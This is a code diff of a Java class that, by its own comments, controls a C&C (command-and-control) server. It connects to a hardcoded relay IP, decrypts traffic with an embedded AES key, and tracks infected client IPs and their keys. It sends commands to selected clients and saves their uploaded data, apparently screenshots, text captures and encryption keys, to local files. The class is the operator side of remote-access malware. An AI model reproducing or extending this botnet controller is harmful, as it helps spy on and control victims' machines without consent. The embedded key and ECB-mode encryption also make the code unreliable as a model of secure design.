@@ -1,56 +1,116 @@
 package model;
 
-import static model.ClientStatus.GREEN;
 import static model.MessageState.*;
 
+import java.awt.Color;
+import java.io.BufferedReader;
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.InetAddress;
-import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.UnknownHostException;
+import java.security.InvalidKeyException;
+import java.security.KeyFactory;
+import java.security.KeyPair;
+import java.security.KeyPairGenerator;
+import java.security.NoSuchAlgorithmException;
+import java.security.PrivateKey;
+import java.security.PublicKey;
+import java.security.spec.X509EncodedKeySpec;
 import java.util.ArrayList;
 import java.util.Collections;
+import java.util.HashMap;
 import java.util.HashSet;
 import java.util.List;
+import java.util.Map;
 import java.util.Set;
 import java.util.concurrent.ArrayBlockingQueue;
 import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.ConcurrentHashMap;
+
+import javax.crypto.BadPaddingException;
+import javax.crypto.Cipher;
+import javax.crypto.CipherInputStream;
+import javax.crypto.CipherOutputStream;
+import javax.crypto.IllegalBlockSizeException;
+import javax.crypto.KeyAgreement;
+import javax.crypto.NoSuchPaddingException;
+import javax.crypto.SecretKey;
+import javax.crypto.spec.SecretKeySpec;
+
+import com.sun.org.apache.regexp.internal.RE;
 
 import view.GUI;
 
 public class Server {
 
   private static final int PORT_NUMBER = 5720;
-  private static final int MAX_CONNECTIONS = 20;
-  private static final int MAX_MESSAGE_QUEUE_SIZE = 100;
+  // milliseconds to wait before exiting on failure to connect to C&C server
+  private static final int EXIT_TIMEOUT = 10000;
+  private static final String SERVER_IP = "54.69.185.61";
+  private static final String CIPHER_ALGORITHM = "AES";
+  private static final String CIPHER_IMPLEMENTATION = "AES/ECB/NoPadding";
+  // cipher key length in bytes
+  private static final int KEY_LENGTH = 16;
 
-  private final BlockingQueue<Message> clientMessages;
-  private final Set<ClientConnection> clients;
+  private static final byte[] RELAY_SERVER_KEY = {0x40, 0x73, (byte)0x8a, (byte)0xc7, (byte)0x8f, 0x0f, (byte)0xd5, (byte)0xef, 0x02, 0x57, (byte)0xb2, (byte)0xe1, (byte)0x9b, (byte)0x83, 0x04, 0x15};
+
+  private final Map<InetAddress, ClientConnection> clientsAndKeys;
+  public final Set<InetAddress> selectedClients;
+
   private Socket s;
   private InputStream in;
   private PrintWriter out;
+  private CipherInputStream cin;
+  private CipherInputStream cin2;
+  private CipherOutputStream cout;
   private String filename;
-  private List<InetAddress> ips;
-
+  private FileOutputStream fos;
   private GUI gui;
 
   public Server() {
-    clientMessages = new ArrayBlockingQueue<Message>(MAX_MESSAGE_QUEUE_SIZE);
-    clients = Collections.newSetFromMap(new ConcurrentHashMap<ClientConnection, Boolean>());
+    gui = new GUI(this);
+    gui.setVisible(true);
+    //    clients = new HashSet<InetAddress>();
+    clientsAndKeys = new HashMap<InetAddress, ClientConnection>();
+    selectedClients = new HashSet<InetAddress>();
 
     try {
-      s = new Socket(InetAddress.getByName("25.135.29.20"), PORT_NUMBER);
-      in = s.getInputStream();
-      out = new PrintWriter(s.getOutputStream(), true);
-      System.out.println(":) connection successful");
+      consoleMessage("Attempting to connect to the C&C server...", Color.WHITE);
+      s = new Socket(InetAddress.getByName(SERVER_IP), PORT_NUMBER);
+      //      byte[] keyBytes = new byte[KEY_LENGTH];
+      //      //      s.getInputStream().read(keyBytes, 0, 16);
+      //
+      //      SecretKey key = new SecretKeySpec(keyBytes, CIPHER_ALGORITHM);
+      Cipher decrypt;
+      decrypt = Cipher.getInstance(CIPHER_IMPLEMENTATION);
+      decrypt.init(Cipher.DECRYPT_MODE, new SecretKeySpec(RELAY_SERVER_KEY, CIPHER_ALGORITHM));
 
-    } catch (IOException e) {
-      e.printStackTrace();
+      in = s.getInputStream();
+      cin2 = new CipherInputStream(in, decrypt);
+
+      out = new PrintWriter(s.getOutputStream(), true);
+      consoleMessage("Connected successfully to the C&C server", Color.GREEN);
+    } catch (IOException | NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException e) {
+      consoleMessage("Could not connect to the C&C server. It may be offline", Color.RED);
+      consoleMessage("Exiting program in 10 seconds...", Color.RED);
+      new Thread() {
+        @Override
+        public void run() {
+          try {
+            sleep(EXIT_TIMEOUT);
+          } catch (InterruptedException e) {
+            e.printStackTrace();
+          }
+          System.exit(1);
+        };
+      }.start();
     }
 
     new Thread() {
@@ -65,18 +125,16 @@ public class Server {
         byte[] bytes = null;
         String toIp = "";
         String fromIp = "";
-        String ipList = "";
-
+        byte[] ipList = null;
 
         try {
           // state machine that handles input from the server
-          while (true) {
-            System.out.println(state);
+          while (in != null) {
             if (state == NORMAL) {
               if ((character = in.read()) == -1) break;
 
               if (character != '!') {
-                System.out.println("Expecting ! for state NORMAL, got: " + character + " " + (char)character);
+                consoleMessage("Protocol error: expecting ! for state NORMAL, got: " + character + " " + (char)character, Color.RED);
               } else {
                 state = GETTING_TYPE;
               }
@@ -89,7 +147,7 @@ public class Server {
                 messageType *= 10;
                 messageType += character - '0';
               } else {
-                System.out.println("Expecting 0-9 for state WAITING_FOR_TYPE, got: " + character + " " + (char)character);
+                consoleMessage("Protocol error: expecting 0-9 for state WAITING_FOR_TYPE, got: " + character + " " + (char)character, Color.RED);
               }
             } else if (state == GETTING_TO_IP) {
               if ((character = in.read()) == -1) break;
@@ -116,7 +174,7 @@ public class Server {
 
                 if (messageType == 100) { // getting list of IPs
                   state = UPDATING_IPS;
-
+                  ipList = new byte[messageLength];
                 } else { // getting data to write to a file
                   switch (messageType) {
                   case 143: 
@@ -132,11 +190,8 @@ public class Server {
                     extension = "txt";
                     break;
                   case 146:
-                    prefix = "idk";
+                    prefix = "encryption key";
                     extension = "txt";
-                    break;
-                  case 147:
-                    System.out.println("hihi");
                     break;
                   default:
                     System.out.println("OH NO");
@@ -146,182 +201,151 @@ public class Server {
                   }
 
                   filename = prefix + " " + toIp + " " + s.getPort() + " " + System.currentTimeMillis() + "." + extension;
+                  fos = new FileOutputStream(filename, true);
                   bytes = new byte[messageLength];
                   offset = 0;
                   state = RECEIVING_DATA;
-                  status("Receiving " + prefix, null);
+                  cin = clientsAndKeys.get(InetAddress.getByName(toIp)).cin;
+                  consoleMessage("Receiving " + prefix + " data from " + toIp, Color.WHITE);
                 }
-
               } else if (character >= '0' && character <= '9'){
                 messageLength *= 10;
                 messageLength += character - '0';
               } else {
-                System.out.println("Expecting 0-9 for state WAITING_FOR_LENGTH, got: " + character + " " + (char)character);
+                consoleMessage("Protocol error: expecting 0-9 for state WAITING_FOR_LENGTH, got: " + character + " " + (char)character, Color.RED);
               }
             } else if (state == RECEIVING_DATA) {
-              length = in.read(bytes, offset, messageLength - offset);
-              writeFile(bytes, offset, length);
+              length = cin.read(bytes, offset, messageLength - offset);
+
+              //              for (int i = 0; i < messageLength; ++i) {
+              //                System.out.print((char)bytes[i]);
+              //              }
+              //              System.out.println();
+
+              try {
+                fos.write(bytes, offset, length);
+              } catch (FileNotFoundException e) {
+                e.printStackTrace();
+              } catch (IOException e) {
+                e.printStackTrace();
+              }
+
               offset += length;
               if (offset >= bytes.length) {
+                fos.close();
+                consoleMessage("Finished receiving data from " + toIp, Color.WHITE);
+                // reset state
                 state = NORMAL;
                 messageLength = 0;
                 messageType = 0;
                 toIp = "";
                 fromIp = "";
-                ipList = "";
+                ipList = null;
               }
             } else if (state == UPDATING_IPS) {
               if (messageLength-- > 0) {
                 if ((character = in.read()) == -1) break;
-                ipList += (char)character;
+                ipList[ipList.length - messageLength - 1] = (byte)character;
               } else {
-                String[] ipStrings = ipList.split(",");
-                ips = new ArrayList<InetAddress>();
-                for (String s : ipStrings) {
-                  if (s != null && !s.isEmpty()) {
-                    ips.add(InetAddress.getByName(s));
+                // parse string into (IP address, encryption key) pairs and put them into map
+                // protocol is IP:KEYIP:KEYIP:KEY... with no delimiter between separate pairs since
+                // the key is of fixed and known length
+                clientsAndKeys.clear();
+
+                boolean inKey = false;
+                String currentIp = "";
+                byte[] currentKey = new byte[KEY_LENGTH];
+                int keyCount = KEY_LENGTH;
+                for (byte i : ipList) {
+                  if (inKey) {
+                    if (keyCount-- > 1) {
+                      currentKey[KEY_LENGTH - keyCount - 1] = i;
+                    } else {
+                      currentKey[KEY_LENGTH - keyCount - 1] = i;
+                      clientsAndKeys.put(InetAddress.getByName(currentIp), new ClientConnection(new SecretKeySpec(currentKey, CIPHER_ALGORITHM), in, s.getOutputStream(), CIPHER_IMPLEMENTATION));
+
+                      // reset state
+                      currentIp = "";
+                      keyCount = KEY_LENGTH;
+                      inKey = false;
+                    }
+                  } else {
+                    if (i != ':') {
+                      currentIp += (char)i;
+                    } else {
+                      inKey = true;
+                    }
                   }
                 }
-                System.out.println(ips);
+
+                //                String[] ipStrings = ipList.split(",");
+                //                clients.clear();
+                //                for (String s : ipStrings) {
+                //                  if (s != null && !s.isEmpty()) {
+                //                    clients.add(InetAddress.getByName(s));
+                //                  }
+                //                }
+
+                gui.updateClients(clientsAndKeys.keySet());
+                updateSelectedClients();
+
+                // reset state
                 state = NORMAL;
                 messageLength = 0;
                 messageType = 0;
                 toIp = "";
                 fromIp = "";
-                ipList = "";
+                ipList = null;
               }
             } else if (state == null) {
-              System.out.println("something went wrong");
+              consoleMessage("Fatal error", Color.RED);
             }
           }
         } catch (IOException e) {
           e.printStackTrace();
         }
-      };
-
-    }.start();
-
-    // listen for new connections (until too many people connect)
-    //    new Thread() {
-    //      @Override
-    //      public void run() {
-    //        while (selectedClients().size() < MAX_CONNECTIONS) {
-    //          try {
-    //            Socket s = s.accept();
-    //            ClientConnection c = new ClientConnection(GREEN, Server.this, s);
-    //            clients.add(c);
-    //            status(s + " connected", null);
-    //          } catch (IOException e) {
-    //            // TODO Auto-generated catch block
-    //            e.printStackTrace();
-    //          }
-    //        }
-    //      }
-    //
-    //    }.start();
-
-    // process messages from clients as they come in
-    //    new Thread() {
-    //      @Override
-    //      public void run() {
-    //        try {
-    //          while (Math.random() == 3) {
-    //            Message message = clientMessages.take();
-    //            ClientConnection c = message.c;
-    //            String s = message.s;
-    //            System.out.println("\tmessage: " + s);
-    //
-    //            if (c.state == NORMAL) {
-    //              if (s.startsWith("screenshot-size:")) {
-    //                int bufferLength = Integer.parseInt(s.replace("screenshot-size: ", ""));
-    ////                c.state = SENDING_PICTURE;
-    //                c.bufferLength = bufferLength;
-    //              } else {
-    //                // nothing
-    //              }
-    //            } else if (c.state == MessageState.RECEIVING_DATA) {
-    ////              c.writeFile(s);
-    //            }
-    //          }
-    //                   
-    //        } catch (InterruptedException e) {
-    //          // TODO Auto-generated catch block
-    //          e.printStackTrace();
-    //        }
-    //      
-    //      }
-    //    }.start();
-  }
-
-  private Set<ClientConnection> selectedClients() {
-    Set<ClientConnection> selectedClients = new HashSet<ClientConnection>();
-    for (ClientConnection c : clients) {
-      if (c.status == GREEN) {
-        selectedClients.add(c);
       }
-    }
-    System.out.println(selectedClients.size());
-    return selectedClients;
+    }.start();
   }
 
-  public void sendCommand(int command) {
-    Set<ClientConnection> selectedClients = selectedClients();
-    for (ClientConnection c : selectedClients) {
-      // TODO
-      c.sendCommand(command);
-    }
+  protected void updateSelectedClients() {
+    gui.updateSelectedClients();
+  }
+
+  protected void numClients(int size) {
+    gui.numClients(size);
   }
 
   public void sendCommand(String command, String data) {
-//    Set<ClientConnection> selectedClients = selectedClients();
-//    for (ClientConnection c : selectedClients) {
     if (data == null) {
       data = "";
     }
 
-    for (InetAddress i : ips) {
+    updateSelectedClients();
+    for (InetAddress i : selectedClients) {
       try {
-        out.write("!" + command + "!" + i.getHostAddress() + "!" + InetAddress.getLocalHost().getHostAddress() + "!" + data.length() + "!" + data);
+        out.write("!" + command + "!" + i.getHostAddress() + "!" + "" + "!" + data.length() + "!");
         out.flush();
+
+        if (!data.isEmpty()) {
+          cout = clientsAndKeys.get(i).cout;
+          cout.write(data.getBytes());
+          cout.flush();
+        }
         System.out.println("!" + command + "!" + i.getHostAddress() + "!" + InetAddress.getLocalHost().getHostAddress() + "!" + data.length() + "!" + data);
       } catch (UnknownHostException e) {
+        e.printStackTrace();
+      } catch (IOException e) {
         e.printStackTrace();
       }
     }
   }
 
+  public void consoleMessage(String message, Color color) {
+    gui.consoleMessage(message, color);
+  }
+
   public void setGui(GUI gui) {
     this.gui = gui;
   }
-
-  public void status(String string, ClientConnection cc) {
-    System.out.println(string);
-    gui.status(((cc == null) ? "" : cc.socket.getInetAddress().getHostAddress() + ": ") + string);
-  }
-
-  public void writeFile(byte[] bytes, int offset, int length) {
-    FileOutputStream out;
-    try {
-      out = new FileOutputStream(filename, true);
-      out.write(bytes, offset, length);
-      out.close();
-    } catch (FileNotFoundException e) {
-      e.printStackTrace();
-    } catch (IOException e) {
-      e.printStackTrace();
-    }
-  }
-
-
-
-  //  public void receiveMessage(String line, ClientConnection c) {
-  //    clientMessages.add(new Message(line, c));
-  //    // TODO: catch exception if queue full
-  //  }
-
-  //  public void receiveMessage(int character, ClientConnection c) {
-  //    clientMessages.add(new Message(character, c));
-  //    // TODO: catch exception if queue full
-  //  }
-
 }
